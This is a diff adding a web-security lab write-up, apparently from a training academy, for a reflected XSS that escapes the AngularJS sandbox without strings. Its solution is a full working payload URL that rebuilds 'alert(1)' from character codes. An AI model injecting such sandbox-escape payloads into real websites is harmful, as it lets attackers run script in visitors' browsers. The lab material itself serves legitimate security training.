@@ -1,0 +1,10 @@
+// Lab: Reflected XSS with AngularJS sandbox escape without strings
+
+This lab uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS.
+To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function.
+
+
+// Solution
+
+Inject this in the Lab URL:
+https://0a66002504dd90be804b301300fd00ef.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
